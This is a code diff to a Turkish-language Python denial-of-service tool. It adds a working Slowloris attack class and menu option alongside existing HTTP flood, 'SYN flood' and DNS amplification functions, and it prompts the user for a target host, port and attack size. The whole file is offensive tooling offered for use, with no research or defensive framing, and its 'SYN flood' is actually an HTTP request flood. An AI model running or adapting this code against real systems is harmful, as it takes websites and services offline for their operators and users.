@@ -1,15 +1,75 @@
+import socket
+import random
+import time
 import cloudscraper
 import threading
-import time
-import socket
-from random import randint
 import concurrent.futures
-import subprocess
+import subprocess 
+
 
 # Renk kodları
 GREEN = '\033[92m'
 RED = '\033[91m'
 RESET = '\033[0m'
+
+class Slowloris:
+    def __init__(self, target_host, target_port, num_connections, timeout=5):
+        self.target_host = target_host
+        self.target_port = target_port
+        self.num_connections = num_connections
+        self.timeout = timeout
+        self.sockets = []
+
+    def establish_connections(self):
+        # Belirtilen sayıda bağlantı oluştur
+        for _ in range(self.num_connections):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(self.timeout)
+                s.connect((self.target_host, self.target_port))
+                self.sockets.append(s)
+                print(f"[Başarı] Bağlanan soket sayısı: {len(self.sockets)}")
+            except Exception as e:
+                print(f"[Hata] Bağlantı oluşturulurken bir hata oluştu: {e}")
+
+    def send_headers(self):
+        # Oluşturulan her bağlantı üzerinden yavaşça eksik HTTP başlıkları gönder
+        while True:
+            for s in self.sockets:
+                try:
+                    # Rastgele bir URL oluştur
+                    url = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(10))
+                    headers = f"GET /{url} HTTP/1.1\r\n"
+                    headers += f"Host: {self.target_host}\r\n"
+                    headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
+                    headers += "Accept-language: en-US,en,q=0.5\r\n"
+                    s.sendall(headers.encode())
+                    print(f"[Başarı] Başlık gönderildi - {url}")
+                except Exception as e:
+                    print(f"[Hata] Başlık gönderilirken bir hata oluştu: {e}")
+
+            # Bağlantılar kapatıldığında soketleri yeniden oluştur
+            self.sockets = [s for s in self.sockets if s.fileno() != -1]
+            while len(self.sockets) < self.num_connections:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(self.timeout)
+                    s.connect((self.target_host, self.target_port))
+                    self.sockets.append(s)
+                    print(f"[Başarı] Yeni soket oluşturuldu - Toplam soket sayısı: {len(self.sockets)}")
+                except Exception as e:
+                    print(f"[Hata] Yeni soket oluşturulurken bir hata oluştu: {e}")
+
+            time.sleep(15)
+
+    def close_connections(self):
+        # Tüm bağlantıları kapat
+        for s in self.sockets:
+            try:
+                s.close()
+                print("[Başarı] Bağlantı kapatıldı")
+            except Exception as e:
+                print(f"[Hata] Bağlantı kapatılırken bir hata oluştu: {e}")
 
 class DDoSAttack:
     def __init__(self, url, num_threads, num_requests_per_thread, interval_between_requests):
@@ -50,8 +110,8 @@ class SynFloodAttack:
     def syn_flood(self):
         while not self.stop_event.is_set():
             try:
-                source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
-                source_port = randint(1024, 65535)
+                source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+                source_port = random.randint(1024, 65535)
 
                 syn_packet = b"GET / HTTP/1.1\r\nHost: " + self.target_url.encode() + b"\r\n\r\n"
                 response = self.scraper.get(self.target_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2)
@@ -89,7 +149,7 @@ def dns_amplification(url, attack_intensity, attack_duration):
         while time.time() - start_time < attack_duration:
             futures = []
             for _ in range(attack_intensity):
-                source_port = randint(1024, 65535)
+                source_port = random.randint(1024, 65535)
                 futures.append(executor.submit(send_dns_packet, ip_address, destination_port, dns_query, source_port))
             for future in concurrent.futures.as_completed(futures):
                 result = future.result()
@@ -130,7 +190,7 @@ def http_get_flood():
     ddos_attack.start_attack()
 
 def syn_flood():
-    target_url = input("Hedef URL'yi girin (örneğin www.example.com): ")
+    target_url = input("Hedef URL'yi girin (örneğin https://www.example.com): ")
     target_port = int(input("Hedef port numarasını girin: "))
     duration = int(input("Saldırı süresini (saniye cinsinden) girin: "))
     num_threads = int(input("Kullanılacak saldırgan sayısını girin: "))
@@ -150,6 +210,15 @@ def dns_amplification_attack():
 
     dns_amplification(url, attack_intensity, attack_duration)
 
+def slowloris_attack():
+    target_host = input("Hedef IP adresini girin: ")
+    target_port = int(input("Hedef port numarasını girin: "))
+    num_connections = int(input("Kaç adet bağlantı oluşturmak istiyorsunuz?: "))
+
+    slowloris = Slowloris(target_host, target_port, num_connections)
+    slowloris.establish_connections()
+    slowloris.send_headers()
+
 def default_case():
     print("Geçersiz seçim. Lütfen geçerli bir seçenek seçin.")
 
@@ -157,11 +226,12 @@ def default_case():
 options = {
     1: http_get_flood,
     2: syn_flood,
-    3: dns_amplification_attack
+    3: dns_amplification_attack,
+    4: slowloris_attack
 }
 
 # Kullanıcıdan seçim yapılmasını isteniliyor
-choice = int(input("Seçenekleri belirtin:\n1. Http_get_attack\n2. Syn_flood_attack\n3. Dns_amplification_attack\nLütfen seçiminizi yapın: "))
+choice = int(input("Seçenekleri belirtin:\n1. Http_get_attack\n2. Syn_flood_attack\n3. Dns_amplification_attack\n4. Slowloris_attack\nLütfen seçiminizi yapın: "))
 
 # Seçime göre doğru fonksiyonu çağır
 options.get(choice, default_case)()
